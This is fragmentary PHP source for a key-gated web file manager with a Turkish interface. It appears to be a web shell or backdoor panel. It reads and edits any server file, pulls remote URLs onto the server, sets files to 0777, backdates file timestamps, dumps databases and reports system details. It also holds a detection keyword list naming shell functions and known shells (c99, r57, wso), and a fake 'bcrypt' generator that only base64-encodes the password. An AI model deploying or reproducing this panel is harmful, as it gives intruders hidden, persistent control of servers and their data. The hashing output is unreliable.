...
function isShellContent($path) {
    ...
    if (!in_array($ext, $phpExtensions) && basename($path) !== '.htaccess') return false;
    if (!is_file($path) || filesize($path) > 1024 * 512) return false;
    $content = @file_get_contents($path);
    if ($content === false) return false;
    $shellKeywords = ['passthru(', 'shell_exec(', 'system(', 'exec(', 'proc_open(', 'popen(', 'assert(', 'c99', 'r57', 'wso'];
    foreach ($shellKeywords as $keyword) { if (stripos($content, $keyword) !== false) return true; }
    return false;
}
...
function getFileList($dir) {
    ...
    foreach ($items as $item) {
        ...
        $entry = array('name' => $item, 'path' => $path, 'type' => is_dir($path) ? 'dir' : 'file', 'size' => is_file($path) ? filesize($path) : 0, 'mtime' => @filemtime($path), 'ctime' => @filectime($path), 'icon' => is_dir($path) ? 'bi bi-folder-fill text-warning' : getFileIcon($item), 'perms' => sprintf('%o', $perms), 'is_recursive' => false);
        if (is_dir($path)) $dirs[] = $entry; else $files[] = $entry;
    }
    return array_merge($dirs, $files);
}
function getRecentFilesRecursive($dir, $timeAgo, $contentFilter, $phpExtensions, $basePath) {
    $results = [];
    ...
    foreach ($items as $item) {
        ...
        if (@is_dir($path)) {
            $results = array_merge($results, getRecentFilesRecursive($path, $timeAgo, $contentFilter, $phpExtensions, $basePath));
        } else {
            if ($timeAgo === 0 || $mtime >= $timeAgo || $ctime >= $timeAgo) {
                $passContentFilter = true;
                $ext = strtolower(pathinfo($item, PATHINFO_EXTENSION));
                if ($contentFilter === 'php_extensions') {
                    if (!in_array($ext, $phpExtensions) && $item !== '.htaccess') $passContentFilter = false;
...
function getBreadcrumb($dir) {
    global $baseDir; global $KEY_PARAM;
...
function getServerInfo() {
    return array('uname' => php_uname(), 'user_id' => get_current_user() ?: 'N/A', 'php_version' => phpversion(), 'safe_mode' => ini_get('safe_mode') ? 'ON' : 'OFF', 'server_ip' => $_SERVER['SERVER_ADDR'] ?? 'N/A', 'client_ip' => $_SERVER['REMOTE_ADDR'] ?? 'N/A', 'datetime' => date('Y-m-d H:i:s'), 'hdd_total' => disk_total_space('/') ?? 0, 'hdd_free' => disk_free_space('/') ?? 0);
}
...
$timeRanges = ['original'=>0,'today'=>1*24*60*60,'1day'=>1*24*60*60,'3days'=>3*24*60*60,'1week'=>7*24*60*60,'15days'=>15*24*60*60,'1month'=>30*24*60*60,'3months'=>90*24*60*60,'6months'=>180*24*60*60,'1year'=>365*24*60*60];
...
$phpExtensions = ['php', 'phtml', 'phptml', 'php7', 'php5', 'php3', 'htaccess'];
...
if ($action === 'get_file_content' && isset($_GET['file'])) {
    ...
    if ($file && is_file($file)) {
        ...
        if ($content !== false) {
            ...
            echo json_encode(['content' => $content, 'perms' => sprintf('%o', fileperms($file) & 0777), 'mtime' => date('Y-m-d H:i:s', filemtime($file)), 'url' => getServerFileUrl($file) ?: '']);
        ...
        foreach ($urls as $url) {
            ...
            if (filter_var($url, FILTER_VALIDATE_URL)) {
                ...
                if ($content !== false && file_put_contents($fileName, $content)) {
                    @chmod($fileName, 0777); $fullUrl = getServerFileUrl($fileName); $success .= 'İndirildi: <a href="' . $fullUrl . '" target="_blank">Dosyayı Aç</a><br>';
...
if ($action === 'delete' && isset($_POST['files'])) {
    ...
    foreach ($files as $file) {
        ...
        if(!$filePath) $filePath = realpath($file);
        if ($filePath && file_exists($filePath)) {
            if (deleteRecursive($filePath)) $deleted[] = htmlspecialchars($file); else $error .= 'Silinemedi: ' . htmlspecialchars($file) . '<br>';
        } else { $error .= 'Bulunamadı: ' . htmlspecialchars($file) . '<br>'; }
    }
    if ($deleted) $success = 'Silindi: ' . implode(', ', $deleted); else if(!$error) $error = 'Silme hatası!';
}
if ($action === 'rename' && isset($_POST['old_name'], $_POST['new_name'])) {
    $oldPath = realpath($currentDir . DIRECTORY_SEPARATOR . $_POST['old_name']);
    if(!$oldPath) $oldPath = realpath($_POST['old_name']);
    ...
    if ($destDir) {
        foreach ($files as $file) {
            ...
            if ($filePath && !file_exists($dest)) {
                if (@rename($filePath, $dest)) { $moved[] = htmlspecialchars(basename($file)); @chmod($dest, 0777); } else { $error .= 'Taşınamadı: ' . htmlspecialchars($file) . '<br>'; }
            } else { $error .= file_exists($dest) ? 'Hedefte mevcut: ' . htmlspecialchars($dest) . '<br>' : 'Geçersiz kaynak: ' . htmlspecialchars($file) . '<br>'; }
        }
        $success = $moved ? 'Taşındı: ' . implode(', ', $moved) : ($error ? $error : 'Taşıma başarısız!');
    } else { $error = 'Geçersiz hedef!'; }
}
if ($action === 'copy' && isset($_POST['files'], $_POST['destination'])) {
    ...
    if ($destDir) {
        foreach ($files as $file) {
            ...
            $dest = $destDir . DIRECTORY_SEPARATOR . basename($file);
            if ($filePath && !file_exists($dest)) {
                if (is_dir($filePath)) { copyDirectory($filePath, $dest); $copied[] = htmlspecialchars(basename($file)); @chmod($dest, 0777); }
                elseif (is_file($filePath)) { if (@copy($filePath, $dest)) { $copied[] = htmlspecialchars(basename($file)); @chmod($dest, 0777); } else { $error .= 'Kopyalanamadı: ' . htmlspecialchars($file) . '<br>'; } }
            } else { $error .= file_exists($dest) ? 'Hedefte mevcut: ' . htmlspecialchars($dest) . '<br>' : 'Geçersiz kaynak: ' . htmlspecialchars($file) . '<br>'; }
        }
...
if ($action === 'unzip' && isset($_POST['files'])) {
    ...
    foreach ($files as $file) {
        ...
        if ($filePath && file_exists($filePath)) {
            $zip = new ZipArchive;
            if ($zip->open($filePath) === TRUE) { $zip->extractTo(dirname($filePath)); $zip->close(); $success .= 'Çıkartıldı: ' . htmlspecialchars($file) . '<br>'; }
            else { $error .= 'Çıkartılamadı: ' . htmlspecialchars($file) . '<br>'; }
        }
    }
}
if ($action === 'download' && isset($_POST['files'])) {
    ...
    if (count($files) === 1) {
        ...
        if(!$firstFile) $firstFile = realpath($files[0]);
        if ($firstFile) {
            if (is_file($firstFile)) {
                if (ob_get_level()) ob_end_clean();
                header('Content-Description: File Transfer'); header('Content-Type: application/octet-stream'); header('Content-Disposition: attachment; filename="' . basename($firstFile) . '"'); header('Expires: 0'); header('Cache-Control: must-revalidate'); header('Pragma: public'); header('Content-Length: ' . filesize($firstFile)); readfile($firstFile); exit;
            } else $error = 'Klasörler indirilemez, ziple indiriniz.';
        } else $error = 'İndirme hatası!';
    } else streamZip($files, $currentDir);
}
if (($action === 'directzip' || $action === 'download_zip') && isset($_POST['files'])) {
    $files = is_array($_POST['files']) ? $_POST['files'] : [$_POST['files']];
    if (!empty($files)) { if(!streamZip($files, $currentDir)) $error = 'Zipleme hatası!'; } else $error = 'Dosya seçilmedi!';
}
if ($action === 'sunucuyaziple' && isset($_POST['files'])) {
    $files = is_array($_POST['files']) ? $_POST['files'] : [$_POST['files']];
    $zipName = (count($files) === 1) ? basename($files[0]) . '.zip' : $_SERVER['HTTP_HOST'] . '.zip';
...
if ($action === 'edit' && isset($_POST['file']) && isset($_POST['content'])) {
    ...
    if(!$file) $file = realpath($_POST['file']);
    if ($file && is_file($file)) {
        $content = $_POST['content'];
        $bytesWritten = @file_put_contents($file, $content);
        if ($bytesWritten !== false) { @chmod($file, 0777); $fileUrl = getServerFileUrl($file); $success = 'Kaydedildi: ' . htmlspecialchars($_POST['file']) . ' (' . $bytesWritten . ' bayt) <a href="' . $fileUrl . '" target="_blank">Dosyayı Aç</a>'; }
...
if ($action === 'create_file' && isset($_POST['file_name'])) {
    ...
    if (!file_exists($filePath)) {
        if (@touch($filePath)) {
            if (file_put_contents($filePath, '') !== false) { @chmod($filePath, 0777); header("Location: ?dir=" . urlencode($currentDir) . "&key=" . $KEY_PARAM . "&file_to_edit=" . urlencode($fileName)); exit; }
            else { $error = 'Dosya yazılamadı!'; @unlink($filePath); }
...
if ($action === 'chmod' && isset($_POST['file']) && isset($_POST['perms'])) {
    ...
    if ($file) { if (@chmod($file, $perms)) $success = 'İzinler güncellendi: ' . htmlspecialchars($_POST['file']) . ' -> ' . $_POST['perms']; else $error = 'İzinler güncellenemedi!'; } else $error = 'Geçersiz dosya!';
}
if ($action === 'touch' && isset($_POST['file']) && isset($_POST['mtime'])) {
    $file = realpath($currentDir . DIRECTORY_SEPARATOR . $_POST['file']);
    if(!$file) $file = realpath($_POST['file']);
    $mtime = strtotime($_POST['mtime']);
    if ($file) { if (@touch($file, $mtime)) $success = 'Tarih güncellendi: ' . htmlspecialchars($_POST['file']) . ' -> ' . date('Y-m-d H:i:s', $mtime); else $error = 'Tarih güncellenemedi!'; } else $error = 'Geçersiz dosya!';
}
if ($action === 'database_export' && isset($_POST['host'], $_POST['user'], $_POST['pass'], $_POST['db'])) {
    try {
        ...
        $filename = preg_replace('/[^a-zA-Z0-9_]/', '', $_POST['db']) . '_' . date('Y-m-d_H-i-s');
        $sql_file = $currentDir . DIRECTORY_SEPARATOR . $filename . '.sql';
        $fp = @fopen($sql_file, 'w');
        if (!$fp) throw new Exception("SQL dosyası oluşturulamadı!");
        $tables = array(); $result = $conn->query("SHOW TABLES");
        while ($row = $result->fetch_array()) $tables[] = $row[0];
        foreach ($tables as $table) {
            fwrite($fp, "-- Table: `$table`\n"); fwrite($fp, "DROP TABLE IF EXISTS `$table`;\n");
            $result = $conn->query("SHOW CREATE TABLE `$table`"); $row = $result->fetch_array(); fwrite($fp, $row[1] . ";\n\n");
        ...
        @fclose($fp); $conn->close();
        if (file_exists($sql_file)) {
            $fileSize = filesize($sql_file);
            header('Content-Description: File Transfer'); header('Content-Type: application/octet-stream'); header('Content-Disposition: attachment; filename="' . basename($sql_file) . '"'); header('Content-Length: ' . $fileSize); readfile($sql_file); @unlink($sql_file); exit;
        } else throw new Exception("SQL dosyası oluşturulamadı!");
...
if ($action === 'database_import' && isset($_FILES['sql_file'])) {
    try {
        ...
        $conn->close();
    } catch (Exception $e) { $error = 'İçe Aktarma Hatası: ' . $e->getMessage(); }
}
...
if ($action === 'search' && isset($_GET['query'])) {
    ...
    if ($searchType === 'content') {
        $scanFiles = getFileList($currentDir);
        foreach ($scanFiles as $file) {
            if ($file['type'] === 'file') {
                $content = @file_get_contents($file['path']);
                if ($content !== false && stripos($content, $query) !== false) $files[] = $file;
            }
        }
    } else {
        $scanFiles = getFileList($currentDir);
        foreach ($scanFiles as $file) { if (stripos($file['name'], $query) !== false) $files[] = $file; }
    }
} else {
    if ($mode === 'advanced') {
        $files = getRecentFilesRecursive($currentDir, $timeAgo, $contentFilter, $phpExtensions, $currentDir);
    } else {
...
<body>
    ...
    <div class="container mt-4">
        ...
        <div class="mode-switch">
             <div class="btn-group w-100 btn-group-sm" role="group">
                <a href="?dir=<?php echo urlencode($currentDir); ?>&key=<?php echo $KEY_PARAM; ?>&mode=file_manager" class="btn <?php echo $mode === 'file_manager' ? 'btn-primary' : 'btn-outline-primary'; ?>">
                    <i class="bi bi-folder2-open"></i> Dosya Yönetim
                </a>
                <a href="?dir=<?php echo urlencode($currentDir); ?>&key=<?php echo $KEY_PARAM; ?>&mode=advanced" class="btn <?php echo $mode === 'advanced' ? 'btn-primary' : 'btn-outline-primary'; ?>">
                    <i class="bi bi-activity"></i> Gelişmiş Tarama / Monitör
                </a>
            </div>
        </div>
        ...
        <div class="advanced-filters">
            <form method="GET" class="row g-2 align-items-center">
                ...
                <div class="col-md-5">
                    <select class="form-select form-select-sm" name="range" onchange="toggleCustomDate(this.value)">
                        <option value="original" <?php echo $timeRange === 'original' ? 'selected' : ''; ?>>Tüm Zamanlar (Recursive)</option>
                        ...
                        <option value="custom_date" <?php echo $timeRange === 'custom_date' ? 'selected' : ''; ?>>Özel Tarih Seç</option>
                    </select>
                </div>
                <div class="col-md-2" id="date_custom_container" style="display: <?php echo $isCustomRange ? 'block' : 'none'; ?>;">
                     <input type="date" class="form-control form-select-sm" name="date_custom" value="<?php echo htmlspecialchars($customDate); ?>">
                </div>
                <div class="col-md-4">
                    <select class="form-select form-select-sm" name="content_filter">
                        <option value="all" <?php echo $contentFilter === 'all' ? 'selected' : ''; ?>>Tüm Dosyalar</option>
                        <option value="php_extensions" <?php echo $contentFilter === 'php_extensions' ? 'selected' : ''; ?>>Sadece PHP</option>
                        <option value="shells" <?php echo $contentFilter === 'shells' ? 'selected' : ''; ?>>Shell Taraması</option>
                        <option value="encrypted" <?php echo $contentFilter === 'encrypted' ? 'selected' : ''; ?>>Şifreli/Gizli Kod Taraması</option>
                    </select>
                </div>
                <div class="col-md-1">
                    <button type="submit" class="btn btn-sm btn-success w-100">Uygula</button>
                </div>
            </form>
        </div>
        <?php endif; ?>
        ...
        <form method="GET" action="" class="mb-3" id="searchForm">
            ...
            <div class="input-group">
                ...
                <input type="text" class="form-control" name="query" id="searchInput" placeholder="Ara..." value="<?php echo isset($_GET['query']) ? htmlspecialchars($_GET['query']) : ''; ?>" oninput="handleSearchInput()">
                <button class="btn btn-primary" type="submit"><i class="bi bi-search"></i> Ara</button>
            </div>
        </form>
        <?php
            $baseLink = "?dir=" . urlencode($currentDir) . "&key=" . $KEY_PARAM . "&mode=" . urlencode($mode) . "&range=" . urlencode($timeRange) . "&content_filter=" . urlencode($contentFilter) . ($isCustomRange ? "&date_custom=" . urlencode($customDate) : "") . (isset($_GET['query']) ? "&action=search&query=" . urlencode($_GET['query']) . "&search_type=" . urlencode($searchType) : "");
            ...
            <table class="table table-hover table-striped">
                <thead>
                    <tr>
                        ...
                        <th><a href="<?php echo $baseLink . '&sort=name&order=' . $newOrder; ?>" class="sort-link">Ad <?php if($sort=='name') echo ($order=='asc'?'<i class="bi bi-arrow-up"></i>':'<i class="bi bi-arrow-down"></i>'); ?></a></th>
                        <th><a href="<?php echo $baseLink . '&sort=size&order=' . $newOrder; ?>" class="sort-link">Boyut <?php if($sort=='size') echo ($order=='asc'?'<i class="bi bi-arrow-up"></i>':'<i class="bi bi-arrow-down"></i>'); ?></a></th>
                        <th><a href="<?php echo $baseLink . '&sort=ctime&order=' . $newOrder; ?>" class="sort-link">Yüklenme (Oluşturma) <?php if($sort=='ctime') echo ($order=='asc'?'<i class="bi bi-arrow-up"></i>':'<i class="bi bi-arrow-down"></i>'); ?></a></th>
                        <th><a href="<?php echo $baseLink . '&sort=mtime&order=' . $newOrder; ?>" class="sort-link">Son Güncelleme <?php if($sort=='mtime') echo ($order=='asc'?'<i class="bi bi-arrow-up"></i>':'<i class="bi bi-arrow-down"></i>'); ?></a></th>
                        <th>İzinler</th>
                    </tr>
                </thead>
                <tbody>
                    ...
                    if ($mode !== 'advanced' && !isset($_GET['query']) && realpath($parentDir) !== realpath($currentDir)) { 
                    ?>
                    ...
                    <?php foreach ($files as $file) { 
                        ...
                        $checkboxValue = ($mode === 'advanced' || isset($_GET['query'])) ? $file['path'] : $file['name'];
                        $editValue = ($mode === 'advanced' || isset($_GET['query'])) ? $file['path'] : $file['name'];
                    ?>
                    <tr data-file-name="<?php echo htmlspecialchars($file['name']); ?>" data-file-type="<?php echo $file['type']; ?>" data-perms="<?php echo $file['perms']; ?>" data-mtime="<?php echo $file['mtime'] ? date('Y-m-d H:i:s', $file['mtime']) : ''; ?>" data-file-url="<?php echo htmlspecialchars($fileUrl); ?>">
                        <td><input type="checkbox" name="file[]" value="<?php echo htmlspecialchars($checkboxValue); ?>" onchange="updateFileSelection()"></td>
                        <td>
                            ...
                            <?php } else { ?>
                                <a href="#" onclick="openEditModal('<?php echo htmlspecialchars($editValue, ENT_QUOTES); ?>'); return false;" class="<?php echo $nameClass; ?>"><?php echo htmlspecialchars($file['name']); ?></a>
                            <?php } ?>
                            <?php if(isset($file['is_recursive']) && $file['is_recursive']): ?> <span class="badge bg-secondary" style="font-size:10px;">Recursive</span> <?php endif; ?>
                        </td>
                    ...
                    <?php } 
                    if (empty($files)) { echo '<tr><td colspan="6" class="text-center">Dosya bulunamadı</td></tr>'; }
                    ?>
                </tbody>
            </table>
        </div>
                ...
                <div class="modal-content">
                    <div class="modal-header">
                        <div class="modal-header-custom">
                            <h5 class="modal-title modal-title-custom" id="editModalLabel"><i class="bi bi-code-square"></i> Düzenle: <span id="modalFileName" class="text-primary"></span></h5>
    ...
    <script>
        ...
        function getAceMode(fileName) {
            ...
            const modes = {'php': 'php', 'html': 'html', 'htm': 'html', 'css': 'css', 'js': 'javascript', 'json': 'json', 'xml': 'xml', 'txt': 'text', 'sql': 'sql', 'py': 'python', 'rb': 'ruby', 'java': 'java', 'c': 'c_cpp', 'cpp': 'c_cpp', 'md': 'markdown', 'htaccess': 'apache_conf'};
        ...
        function openEditModal(fileName) {
            ...
            const row = document.querySelector(`tr[data-file-name="${fileName.replace(/"/g, '&quot;')}"]`);
            if (row) {
            ...
            fetch(`?action=get_file_content&dir=<?php echo urlencode($currentDir); ?>&key=<?php echo $KEY_PARAM; ?>&file=${encodeURIComponent(fileName)}`).then(response => {
        ...
        function setSingleActionValues(action) {
            ...
            } else if (action === 'edit') openEditModal(fileName);
        }
        ...
        function copyCurrentPath(path) {
            navigator.clipboard.writeText(path).then(() => { showToast('Dizin yolu kopyalandı!', 'success'); }).catch(() => { showToast('Kopyalama başarısız!', 'danger'); });
        }
        function toggleFolderCreation() {
            ...
            if (isChecked) folderInputDiv.style.display = 'block'; else { folderInputDiv.style.display = 'none'; document.getElementById('uploadFolderName').value = ''; }
        ...
        document.getElementById('fileUploadForm').addEventListener('submit', function() { if (document.getElementById('uploadFolderName').style.display === 'block') document.getElementById('fileUploadFolderName').value = document.getElementById('uploadFolderName').value; });
        document.getElementById('urlUploadForm').addEventListener('submit', function() { if (document.getElementById('uploadFolderName').style.display === 'block') document.getElementById('urlUploadFolderName').value = document.getElementById('uploadFolderName').value; });
        ...
        function generateRandomString() {
            ...
            let result = ''; for (let i = 0; i < 22; i++) result += chars.charAt(Math.floor(Math.random() * chars.length)); return result;
        }
        function generateBcryptHash(password) {
            const salt = '$2y$10$' + generateRandomString(); return salt + btoa(password).substring(0, 43).replace(/\+/g, '.').replace(/\//g, '.');
        }
        function generateHashes() {
            const input = document.getElementById('encryptInput').value; const results = document.getElementById('hashResults');
            if (!input) { results.innerHTML = ''; return; }
            results.innerHTML = '';
            const md5Hash = CryptoJS.MD5(input).toString(); const sha1Hash = CryptoJS.SHA1(input).toString();
            const hashes = [{ name: 'MD5', value: md5Hash }, { name: 'MD5 (SHA1)', value: CryptoJS.MD5(sha1Hash).toString() }, { name: 'SHA1', value: sha1Hash }, { name: 'SHA1 (MD5)', value: CryptoJS.SHA1(md5Hash).toString() }, { name: 'SHA256', value: CryptoJS.SHA256(input).toString() }, { name: 'SHA512', value: CryptoJS.SHA512(input).toString() }, { name: 'SHA3-256', value: CryptoJS.SHA3(input, { outputLength: 256 }).toString() }, { name: 'SHA3-512', value: CryptoJS.SHA3(input, { outputLength: 512 }).toString() }, { name: 'RIPEMD160', value: CryptoJS.RIPEMD160(input).toString() }, { name: 'bcrypt', value: generateBcryptHash(input) }];
            hashes.forEach(hash => {
                const div = document.createElement('div'); div.className = 'hash-result';
                div.innerHTML = `<div><strong>${hash.name}:</strong><br><code>${hash.value}</code></div><button class="btn btn-sm btn-primary" onclick="copyToClipboard('${hash.value}')"><i class="bi bi-clipboard"></i></button>`;
        ...
        function toggleCustomDate(val) {
             document.getElementById('date_custom_container').style.display = (val === 'custom_date') ? 'block' : 'none';
        }
        <?php if ($fileToEdit) { ?> setTimeout(() => { openEditModal('<?php echo addslashes($fileToEdit); ?>'); }, 500); <?php } ?>
    </script>
</body>
</html>